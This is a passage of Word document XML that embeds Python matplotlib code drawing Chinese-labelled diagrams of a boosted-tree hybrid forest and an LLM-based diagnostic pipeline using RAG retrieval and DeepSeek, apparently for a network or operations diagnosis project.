        <w:t xml:space="preserve">        arrow(ax, (x, 84.5), (x, 76))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40958010">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AACCE93">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 6, 52, 44, 24, "基学习器 #1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BE8D40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "随机抽到 XGBoost\n内部浅树 depth ≤ 6\n提升 100 轮", "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6036F298">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 58, 52, 44, 24, "基学习器 #2",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECFFFEC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "随机抽到 LightGBM\n内部浅树 depth ≤ 6\n提升 100 轮", "llm")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B62742">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 110, 52, 44, 24, "基学习器 #N",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD291C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "随机抽到 CatBoost\n内部浅树 depth ≤ 6\n提升 100 轮", "edge")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FCA7BE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39869879">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 汇聚总线</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A375E89">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for x in (28, 80, 132):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5502215D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ax.plot([x, x], [52, 47], color=GREY, lw=1.4, zorder=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41674BFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.plot([28, 132], [47, 47], color=GREY, lw=1.4, zorder=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073F74A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (80, 47), (80, 44))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB9DEF2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66C55578">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 36, 30, 88, 14, "软投票聚合（Soft Voting）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DA67C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "p = (p1 + p2 + … + pN) / N，逐类平均后取最大", "plain")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E142AB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (80, 30), (80, 24))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8B370B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 44, 10, 72, 14, "输出：6 类概率 + 置信度", key="view", hs=9.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547EFF5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09ACDC22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(80, 3.5,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECEDC5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "与随机森林的唯一区别：基学习器由单棵 CART 换成一个小型提升模型，Bagging 骨架与随机特征子集不变",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38431D1D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ha="center", va="center", fontsize=8.0, color=GREY)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C55EAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2351DE76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig.savefig(OUT / "fig2b_hybrid_forest.png", dpi=300)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F29B463">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    plt.close(fig)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49556013">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BD879E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DD32C94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 图 3 LLM 诊断管线</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2449E528">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def fig_llm_pipeline():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF18633">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig, ax = canvas()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E798B0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A462CF9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    yb, hb = 54, 24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145E9413">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 2, yb, 33, hb, "输入：小模型输出",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F916E0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "类别 + 置信度\nTop-k 特征取值\n代表性报文摘要", "plain")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D2A4E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 43, yb, 33, hb, "M9 RAG 检索",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C13166">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "查询构造（类别+特征）\nBM25 检索 Top-3\n知识片段（可溯源）", "center")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE1D528">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 84, yb, 33, hb, "提示词组装",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E54D7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "系统角色：运维专家\n知识片段 + 证据\n输出 schema 约束", "plain")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57117D9F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 125, yb, 33, hb, "LLM 推理",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B6225E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "DeepSeek API\ntemperature = 0.2\n超时 / 重试 / 降级", "llm")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B22AB6E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7685CEF6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for x in (35, 76, 117):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374DDEDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        arrow(ax, (x, yb + hb / 2), (x + 8, yb + hb / 2))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F84E789">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AC3C0B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 43, 84, 33, 14, "离线：教材 + RFC 摘要",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11914BD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "12 条中文知识\n→ 字符二元组索引", "center", dashed=True, lw=1.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557AE608">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (59.5, 84), (59.5, yb + hb), dashed=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D01E3EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4174D316">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 110, 84, 48, 14, "看板内多轮追问",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B8BC49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "携带上一轮报告 + 新问题\n重新进入提示词组装", "view", dashed=True, lw=1.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFCAEB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (134, 84), (134, yb + hb), dashed=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07673711">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="027564A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    box(ax, 2, 4, 156, 40,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5C7A97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "结构化诊断报告（llm/schema.py · Pydantic 强校验，字段缺失即拒绝落库）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F67588">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "", "llm", hs=10.0, head_top=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA42577">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    arrow(ax, (141.5, yb), (141.5, 44), lw=1.7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC82497">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E90371A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fields = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EEA33B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("事件概述", "summary"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7692EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ("风险等级", "risk"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DA9919">
      <w:pPr>
        <w:widowControl w:val="0"/>
